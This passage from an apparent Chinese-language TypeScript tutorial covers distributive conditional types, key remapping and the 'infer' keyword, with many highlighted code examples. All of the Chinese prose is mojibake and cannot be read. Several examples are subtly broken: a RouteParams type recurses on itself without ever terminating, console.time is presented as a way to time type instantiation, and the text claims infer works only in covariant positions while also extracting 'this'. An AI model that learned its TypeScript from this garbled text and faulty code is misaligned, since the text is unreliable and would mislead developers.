class="hljs-built_in">void</span> : <span class="hljs-built_in">never</span> <span class="hljs-title function_">extends</span> (<span class="hljs-attr">arg</span>: infer U) =&gt; <span class="hljs-built_in">void</span> ? U : <span class="hljs-built_in">never</span>;<br></code></pre></td></tr></table></figure><p><strong>åˆ†å¸ƒå¼ä¸æ˜ å°„ç±»å‹ç»“åˆ</strong></p><ol><li>åˆ†å¸ƒå¼é”®åé‡æ˜ å°„ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">AddPrefix</span>&lt;T&gt; = &#123;<br>  [K <span class="hljs-keyword">in</span> keyof T <span class="hljs-keyword">as</span> K <span class="hljs-keyword">extends</span> <span class="hljs-built_in">string</span> ? <span class="hljs-string">`data_<span class="hljs-subst">$&#123;K&#125;</span>`</span> : <span class="hljs-built_in">never</span>]: T[K]<br>&#125;;<br><br><span class="hljs-comment">// ä½¿ç”¨</span><br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Props</span> &#123; <span class="hljs-attr">id</span>: <span class="hljs-built_in">string</span>; <span class="hljs-attr">value</span>: <span class="hljs-built_in">number</span>; &#125;<br><span class="hljs-keyword">type</span> <span class="hljs-title class_">PrefixedProps</span> = <span class="hljs-title class_">AddPrefix</span>&lt;<span class="hljs-title class_">Props</span>&gt;;<br><span class="hljs-comment">// &#123; data_id: string; data_value: number &#125;</span><br></code></pre></td></tr></table></figure><ol start="2"><li>æ¡ä»¶é”®åè¿‡æ»¤ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// ä»…ä¿ç•™å­—ç¬¦ä¸²é”®</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">StringKeys</span>&lt;T&gt; = &#123;<br>  [K <span class="hljs-keyword">in</span> keyof T]: K <span class="hljs-keyword">extends</span> <span class="hljs-built_in">string</span> ? K : <span class="hljs-built_in">never</span><br>&#125;[keyof T];<br><br><span class="hljs-comment">// ä½¿ç”¨</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">Keys</span> = <span class="hljs-title class_">StringKeys</span>&lt;&#123; <span class="hljs-number">1</span>: <span class="hljs-built_in">number</span>; <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-built_in">string</span> &#125;&gt;; <span class="hljs-comment">// &quot;name&quot;</span><br></code></pre></td></tr></table></figure><p><strong>ç¼–è¯‘åŸç†é€è§†</strong></p><ol><li>åˆ†å¸ƒå¼å¤„ç†æµç¨‹ï¼š</li></ol><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text">1. è§£ææ¡ä»¶ç±»å‹ï¼šT extends U ? X : Y<br>2. æ£€æŸ¥Tæ˜¯å¦ä¸ºè£¸ç±»å‹å‚æ•°çš„è”åˆç±»å‹<br>3. è‹¥æ˜¯ï¼Œå¯¹è”åˆç±»å‹æ¯ä¸ªæˆå‘˜è¿›è¡Œç‹¬ç«‹è®¡ç®—<br>4. å°†è®¡ç®—ç»“æœç»„åˆä¸ºæ–°è”åˆç±»å‹<br></code></pre></td></tr></table></figure><ol start="2"><li>ç±»å‹å®ä¾‹åŒ–ä¼˜åŒ–ï¼š<ul><li>TSç¼–è¯‘å™¨å¯¹åˆ†å¸ƒå¼æ¡ä»¶ç±»å‹è¿›è¡Œç¼“å­˜ä¼˜åŒ–</li><li>ç›¸åŒç±»å‹å‚æ•°çš„è®¡ç®—ç»“æœä¼šè¢«å¤ç”¨</li><li>é¿å…é‡å¤è®¡ç®—æå‡æ€§èƒ½</li></ul></li></ol><p><strong>å·¥ç¨‹å®è·µæŒ‡å—</strong></p><ol><li>æ˜ç¡®è®¾è®¡æ„å›¾ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// éœ€è¦åˆ†å‘æ—¶</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">Distributed</span>&lt;T&gt; = T <span class="hljs-keyword">extends</span> <span class="hljs-built_in">any</span> ? T[] : <span class="hljs-built_in">never</span>;<br><br><span class="hljs-comment">// ä¸éœ€è¦åˆ†å‘æ—¶</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">NonDistributed</span>&lt;T&gt; = [T] <span class="hljs-keyword">extends</span> [<span class="hljs-built_in">any</span>] ? T[] : <span class="hljs-built_in">never</span>;<br></code></pre></td></tr></table></figure><ol start="2"><li>æ–‡æ¡£æ³¨é‡Šè§„èŒƒï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * æå–æ•°ç»„å…ƒç´ ç±»å‹ï¼ˆåˆ†å‘æ¨¡å¼ï¼‰</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@template</span> <span class="hljs-variable">T</span> - è”åˆç±»å‹æ•°ç»„</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@example</span> </span><br><span class="hljs-comment"> * type Element = ElementType&lt;Array&lt;string&gt; | Array&lt;number&gt;&gt;; // string | number</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">ElementType</span>&lt;T&gt; = T <span class="hljs-title function_">extends</span> (infer U)[] ? U : <span class="hljs-built_in">never</span>;<br></code></pre></td></tr></table></figure><ol start="3"><li>æ€§èƒ½ç›‘æ§ç­–ç•¥ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// å¤æ‚ç±»å‹æ€§èƒ½æµ‹è¯•</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">StressTest</span>&lt;T&gt; = T <span class="hljs-keyword">extends</span> <span class="hljs-built_in">any</span> <br>  ? <span class="hljs-string">`prefix_<span class="hljs-subst">$&#123;T &amp; <span class="hljs-built_in">string</span>&#125;</span>_suffix`</span> <br>  : <span class="hljs-built_in">never</span>;<br><br><span class="hljs-comment">// æµ‹é‡å®ä¾‹åŒ–æ—¶é—´</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">time</span>(<span class="hljs-string">&quot;type instantiation&quot;</span>);<br><span class="hljs-keyword">type</span> <span class="hljs-title class_">Result</span> = <span class="hljs-title class_">StressTest</span>&lt;<span class="hljs-string">&quot;a&quot;</span> | <span class="hljs-string">&quot;b&quot;</span> | ...&gt;; <span class="hljs-comment">// 100+ é¡¹</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">timeEnd</span>(<span class="hljs-string">&quot;type instantiation&quot;</span>);<br></code></pre></td></tr></table></figure><ol start="4"><li>é”™è¯¯å¤„ç†æ¨¡å¼ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// å®‰å…¨åˆ†å‘ç±»å‹</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">SafeDistribute</span>&lt;T, <span class="hljs-title class_">Fallback</span> = <span class="hljs-built_in">never</span>&gt; = <br>  [T] <span class="hljs-keyword">extends</span> [<span class="hljs-built_in">never</span>] ? <span class="hljs-title class_">Fallback</span> :<br>  T <span class="hljs-keyword">extends</span> <span class="hljs-built_in">any</span> ? <span class="hljs-comment">/* åˆ†å‘é€»è¾‘ */</span> : <span class="hljs-built_in">never</span>;<br><br><span class="hljs-comment">// ä½¿ç”¨</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">Result</span> = <span class="hljs-title class_">SafeDistribute</span>&lt;<span class="hljs-built_in">never</span>, <span class="hljs-string">&quot;empty&quot;</span>&gt;; <span class="hljs-comment">// &quot;empty&quot;</span><br></code></pre></td></tr></table></figure><p><strong>åˆ†å¸ƒå¼ç‰¹æ€§ä¸å†…ç½®å·¥å…·</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs text">åˆ†å¸ƒå¼æ¡ä»¶ç±»å‹åº”ç”¨ä½“ç³»<br>â”œâ”€ é›†åˆæ“ä½œ<br>â”‚  â”œâ”€ Excludeï¼ˆå·®é›†ï¼‰<br>â”‚  â”œâ”€ Extractï¼ˆäº¤é›†ï¼‰<br>â”‚  â””â”€ NonNullableï¼ˆè¿‡æ»¤ï¼‰<br>â”‚<br>â”œâ”€ å‡½æ•°æ“ä½œ<br>â”‚  â”œâ”€ Parameters<br>â”‚  â””â”€ ReturnType<br>â”‚<br>â””â”€ é«˜çº§å·¥å…·<br>   â”œâ”€ UnionToIntersection<br>   â””â”€ UnionToTuple<br></code></pre></td></tr></table></figure><h3 id="2-1-4-infer-å…³é”®å­—ä¸ç±»å‹æå–"><a href="#2-1-4-infer-å…³é”®å­—ä¸ç±»å‹æå–" class="headerlink" title="2.1.4 infer å…³é”®å­—ä¸ç±»å‹æå–"></a>2.1.4 infer å…³é”®å­—ä¸ç±»å‹æå–</h3><p><strong>infer åŸºç¡€æ¦‚å¿µ</strong></p><p>æ ¸å¿ƒåŠŸèƒ½ï¼šåœ¨æ¡ä»¶ç±»å‹ä¸­å£°æ˜æ³›å‹ç±»å‹å˜é‡ï¼Œç”¨äºæ¨å¯¼å’Œæ•è·ç±»å‹ä¿¡æ¯</p><p>åŸºæœ¬è¯­æ³•ï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs typescript">T <span class="hljs-keyword">extends</span> infer U ? U : <span class="hljs-built_in">never</span><br></code></pre></td></tr></table></figure><ul><li>infer U å£°æ˜ä¸€ä¸ªç±»å‹å˜é‡ U</li><li>U çš„ç±»å‹ç”± TypeScript æ ¹æ®ä¸Šä¸‹æ–‡æ¨å¯¼</li></ul><p>ä½ç½®çº¦æŸï¼š</p><ul><li>åªèƒ½åœ¨æ¡ä»¶ç±»å‹çš„ extends å­å¥ä¸­ä½¿ç”¨</li><li>åªèƒ½å‡ºç°åœ¨åå˜ä½ç½®ï¼ˆè¿”å›å€¼ã€å±æ€§å€¼ç­‰ï¼‰</li></ul><p><strong>åŸºç¡€æå–æ¨¡å¼</strong></p><ol><li>æå–å‡½æ•°è¿”å›ç±»å‹ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">ReturnType</span>&lt;T&gt; = <br>  T <span class="hljs-title function_">extends</span> (...<span class="hljs-attr">args</span>: <span class="hljs-built_in">any</span>[]) =&gt; infer R ? R : <span class="hljs-built_in">never</span>;<br><br><span class="hljs-comment">// ä½¿ç”¨</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">FnReturn</span> = <span class="hljs-title class_">ReturnType</span>&lt;<span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">number</span>&gt;; <span class="hljs-comment">// number</span><br></code></pre></td></tr></table></figure><ol start="2"><li>æå–å‡½æ•°å‚æ•°ç±»å‹ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">FirstParam</span>&lt;T&gt; = <br>  T <span class="hljs-title function_">extends</span> (<span class="hljs-attr">first</span>: infer P, ...<span class="hljs-attr">rest</span>: <span class="hljs-built_in">any</span>[]) =&gt; <span class="hljs-built_in">any</span> ? P : <span class="hljs-built_in">never</span>;<br><br><span class="hljs-comment">// ä½¿ç”¨</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">Param</span> = <span class="hljs-title class_">FirstParam</span>&lt;<span class="hljs-function">(<span class="hljs-params"><span class="hljs-attr">a</span>: <span class="hljs-built_in">string</span>, <span class="hljs-attr">b</span>: <span class="hljs-built_in">number</span></span>) =&gt;</span> <span class="hljs-built_in">void</span>&gt;; <span class="hljs-comment">// string</span><br></code></pre></td></tr></table></figure><ol start="3"><li>æå–æ•°ç»„å…ƒç´ ç±»å‹ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">ArrayElement</span>&lt;T&gt; = <br>  T <span class="hljs-title function_">extends</span> (infer U)[] ? U : <span class="hljs-built_in">never</span>;<br><br><span class="hljs-comment">// ä½¿ç”¨</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">Element</span> = <span class="hljs-title class_">ArrayElement</span>&lt;<span class="hljs-built_in">string</span>[]&gt;; <span class="hljs-comment">// string</span><br></code></pre></td></tr></table></figure><p><strong>é«˜çº§æå–æŠ€æœ¯</strong></p><ol><li>é€’å½’ç±»å‹è§£åŒ…ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// è§£åŒ…åµŒå¥—Promise</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">Awaited</span>&lt;T&gt; = <br>  T <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Promise</span>&lt;infer U&gt; ? <span class="hljs-title class_">Awaited</span>&lt;U&gt; : T;<br><br><span class="hljs-comment">// ä½¿ç”¨</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">Result</span> = <span class="hljs-title class_">Awaited</span>&lt;<span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">string</span>&gt;&gt;&gt;; <span class="hljs-comment">// string</span><br></code></pre></td></tr></table></figure><ol start="2"><li>å¤šä¸ª infer å˜é‡ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// æå–å‡½æ•°å‚æ•°å…ƒç»„</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">Params</span>&lt;T&gt; = <br>  T <span class="hljs-title function_">extends</span> (...<span class="hljs-attr">args</span>: infer P) =&gt; <span class="hljs-built_in">any</span> ? P : <span class="hljs-built_in">never</span>;<br><br><span class="hljs-comment">// ä½¿ç”¨</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">FnParams</span> = <span class="hljs-title class_">Params</span>&lt;<span class="hljs-function">(<span class="hljs-params"><span class="hljs-attr">a</span>: <span class="hljs-built_in">string</span>, <span class="hljs-attr">b</span>: <span class="hljs-built_in">number</span></span>) =&gt;</span> <span class="hljs-built_in">void</span>&gt;; <span class="hljs-comment">// [string, number]</span><br></code></pre></td></tr></table></figure><ol start="3"><li>é€†å˜ä½ç½®æå–ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// æå–å‡½æ•°thisç±»å‹</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">ThisType</span>&lt;T&gt; = <br>  T <span class="hljs-title function_">extends</span> (<span class="hljs-attr">this</span>: infer U, ...<span class="hljs-attr">args</span>: <span class="hljs-built_in">any</span>[]) =&gt; <span class="hljs-built_in">any</span> ? U : <span class="hljs-built_in">unknown</span>;<br><br><span class="hljs-comment">// ä½¿ç”¨</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">fn</span>(<span class="hljs-params"><span class="hljs-attr">this</span>: <span class="hljs-title class_">Window</span></span>) &#123;&#125;<br><span class="hljs-keyword">type</span> <span class="hljs-title class_">Context</span> = <span class="hljs-title class_">ThisType</span>&lt;<span class="hljs-keyword">typeof</span> fn&gt;; <span class="hljs-comment">// Window</span><br></code></pre></td></tr></table></figure><p><strong>æ¨¡å¼åŒ¹é…æŠ€æœ¯</strong></p><ol><li>å­—ç¬¦ä¸²æ¨¡æ¿æå–ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// æå–æ¨¡æ¿å­—ç¬¦ä¸²å˜é‡</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">ExtractVariable</span>&lt;T&gt; = <br>  T <span class="hljs-keyword">extends</span> <span class="hljs-string">`user_<span class="hljs-subst">$&#123;infer Id&#125;</span>`</span> ? <span class="hljs-title class_">Id</span> : <span class="hljs-built_in">never</span>;<br><br><span class="hljs-comment">// ä½¿ç”¨</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">UserId</span> = <span class="hljs-title class_">ExtractVariable</span>&lt;<span class="hljs-string">&quot;user_123&quot;</span>&gt;; <span class="hljs-comment">// &quot;123&quot;</span><br></code></pre></td></tr></table></figure><ol start="2"><li>å¯¹è±¡é”®å€¼æå–ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// æå–ç‰¹å®šé”®çš„å€¼ç±»å‹</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">ValueOfKey</span>&lt;T, K <span class="hljs-keyword">extends</span> <span class="hljs-built_in">string</span>&gt; = <br>  T <span class="hljs-keyword">extends</span> &#123; [key <span class="hljs-keyword">in</span> K]: infer V &#125; ? V : <span class="hljs-built_in">never</span>;<br><br><span class="hljs-comment">// ä½¿ç”¨</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">NameType</span> = <span class="hljs-title class_">ValueOfKey</span>&lt;&#123; <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>; <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span> &#125;, <span class="hljs-string">&quot;name&quot;</span>&gt;; <span class="hljs-comment">// string</span><br></code></pre></td></tr></table></figure><ol start="3"><li>æ¡ä»¶åˆ†æ”¯æå–ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// æå–æ»¡è¶³æ¡ä»¶çš„å­ç±»å‹</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">ExtractByType</span>&lt;T, U&gt; = <br>  T <span class="hljs-keyword">extends</span> U ? T : <span class="hljs-built_in">never</span>;<br><br><span class="hljs-comment">// ä½¿ç”¨</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">Strings</span> = <span class="hljs-title class_">ExtractByType</span>&lt;<span class="hljs-string">&quot;a&quot;</span> | <span class="hljs-number">1</span> | <span class="hljs-literal">true</span>, <span class="hljs-built_in">string</span>&gt;; <span class="hljs-comment">// &quot;a&quot;</span><br></code></pre></td></tr></table></figure><p><strong>å†…ç½®å·¥å…·ç±»å‹è§£æ</strong></p><ol><li><code>Parameters&lt;T&gt;</code> å®ç°ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">Parameters</span>&lt;T <span class="hljs-title function_">extends</span> (...<span class="hljs-attr">args</span>: <span class="hljs-built_in">any</span>) =&gt; <span class="hljs-built_in">any</span>&gt; = <br>  T <span class="hljs-title function_">extends</span> (...<span class="hljs-attr">args</span>: infer P) =&gt; <span class="hljs-built_in">any</span> ? P : <span class="hljs-built_in">never</span>;<br></code></pre></td></tr></table></figure><ol start="2"><li><code>ReturnType&lt;T&gt;</code> å®ç°ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">ReturnType</span>&lt;T <span class="hljs-title function_">extends</span> (...<span class="hljs-attr">args</span>: <span class="hljs-built_in">any</span>) =&gt; <span class="hljs-built_in">any</span>&gt; = <br>  T <span class="hljs-title function_">extends</span> (...<span class="hljs-attr">args</span>: <span class="hljs-built_in">any</span>) =&gt; infer R ? R : <span class="hljs-built_in">any</span>;<br></code></pre></td></tr></table></figure><ol start="3"><li><code>ConstructorParameters&lt;T&gt;</code> å®ç°ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">ConstructorParameters</span>&lt;T <span class="hljs-keyword">extends</span> <span class="hljs-title function_">new</span> (...<span class="hljs-attr">args</span>: <span class="hljs-built_in">any</span>) =&gt; <span class="hljs-built_in">any</span>&gt; = <br>  T <span class="hljs-keyword">extends</span> <span class="hljs-title function_">new</span> (...<span class="hljs-attr">args</span>: infer P) =&gt; <span class="hljs-built_in">any</span> ? P : <span class="hljs-built_in">never</span>;<br></code></pre></td></tr></table></figure><p><strong>å·¥ç¨‹åº”ç”¨æ¨¡å¼</strong></p><ol><li>ç»„ä»¶ Props æå–ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// æå–Reactç»„ä»¶Propsç±»å‹</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">ComponentProps</span>&lt;T&gt; = <br>  T <span class="hljs-keyword">extends</span> <span class="hljs-title class_">React</span>.<span class="hljs-property">ComponentType</span>&lt;infer P&gt; ? P : <span class="hljs-built_in">never</span>;<br><br><span class="hljs-comment">// ä½¿ç”¨</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">MyComponent</span>: <span class="hljs-title class_">React</span>.<span class="hljs-property">FC</span>&lt;&#123; <span class="hljs-attr">id</span>: <span class="hljs-built_in">string</span> &#125;&gt; = <span class="hljs-function">() =&gt;</span> <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">type</span> <span class="hljs-title class_">Props</span> = <span class="hljs-title class_">ComponentProps</span>&lt;<span class="hljs-keyword">typeof</span> <span class="hljs-title class_">MyComponent</span>&gt;; <span class="hljs-comment">// &#123; id: string &#125;</span><br></code></pre></td></tr></table></figure><ol start="2"><li>API å“åº”å¤„ç†ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// æå–APIå“åº”ä¸­çš„dataå­—æ®µ</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">ApiResponse</span>&lt;T&gt; = &#123;<br>  <span class="hljs-attr">data</span>: T;<br>  <span class="hljs-attr">status</span>: <span class="hljs-built_in">number</span>;<br>&#125;;<br><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">ResponseData</span>&lt;T&gt; = <br>  T <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ApiResponse</span>&lt;infer D&gt; ? D : <span class="hljs-built_in">never</span>;<br><br><span class="hljs-comment">// ä½¿ç”¨</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">UserData</span> = <span class="hljs-title class_">ResponseData</span>&lt;<span class="hljs-title class_">ApiResponse</span>&lt;&#123; <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span> &#125;&gt;&gt;; <span class="hljs-comment">// &#123; name: string &#125;</span><br></code></pre></td></tr></table></figure><ol start="3"><li>è·¯ç”±å‚æ•°æå–ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// æå–åŠ¨æ€è·¯ç”±å‚æ•°</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">RouteParams</span>&lt;T&gt; = <br>  T <span class="hljs-keyword">extends</span> <span class="hljs-string">`<span class="hljs-subst">$&#123;<span class="hljs-built_in">string</span>&#125;</span>/:<span class="hljs-subst">$&#123;infer Param&#125;</span>/<span class="hljs-subst">$&#123;<span class="hljs-built_in">string</span>&#125;</span>`</span> <br>    ? <span class="hljs-title class_">Param</span> | <span class="hljs-title class_">RouteParams</span>&lt;T&gt; <br>    : T <span class="hljs-keyword">extends</span> <span class="hljs-string">`<span class="hljs-subst">$&#123;<span class="hljs-built_in">string</span>&#125;</span>/:<span class="hljs-subst">$&#123;infer Param&#125;</span>`</span> <br>      ? <span class="hljs-title class_">Param</span> <br>      : <span class="hljs-built_in">never</span>;<br><br><span class="hljs-comment">// ä½¿ç”¨</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">Params</span> = <span class="hljs-title class_">RouteParams</span>&lt;<span class="hljs-string">&quot;/user/:id/profile/:section&quot;</span>&gt;; <span class="hljs-comment">// &quot;id&quot; | &quot;section&quot;</span><br></code></pre></td></tr></table></figure><p><strong>ç¼–è¯‘åŸç†é€è§†</strong></p><ol><li>infer å®ç°æœºåˆ¶ï¼š<ul><li>ç±»å‹ç³»ç»Ÿå®ç°æ¨¡å¼åŒ¹é…</li><li>åœ¨ç±»å‹å…³ç³»æ±‚è§£æ—¶ç»‘å®šç±»å‹å˜é‡</li><li>åŸºäºçº¦æŸçš„ç±»å‹å˜é‡å®ä¾‹åŒ–</li></ul></li><li>ç±»å‹æ¨å¯¼è¿‡ç¨‹ï¼š</li></ol><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs text">1. åŒ¹é…æ¡ä»¶ç±»å‹ç»“æ„<br>2. æå–å€™é€‰ç±»å‹<br>3. ç»‘å®š infer å˜é‡<br>4. éªŒè¯ç±»å‹çº¦æŸ<br>5. å®ä¾‹åŒ–ç»“æœç±»å‹<br></code></pre></td></tr></table></figure><p><strong>æœ€ä½³å®è·µæŒ‡å—</strong></p><ol><li>ç±»å‹å˜é‡å‘½åè§„èŒƒï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// æ¨èï¼šæè¿°æ€§å‘½å</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">ExtractReturn</span>&lt;T&gt; = <br>  T <span class="hljs-title function_">extends</span> (...<span class="hljs-attr">args</span>: <span class="hljs-built_in">any</span>) =&gt; infer <span class="hljs-title class_">ReturnType</span> ? <span class="hljs-title class_">ReturnType</span> : <span class="hljs-built_in">never</span>;<br><br><span class="hljs-comment">// é¿å…ï¼šå•å­—æ¯å‘½å</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">Bad</span>&lt;T&gt; = T <span class="hljs-title function_">extends</span> (...<span class="hljs-attr">a</span>: <span class="hljs-built_in">any</span>) =&gt; infer R ? R : 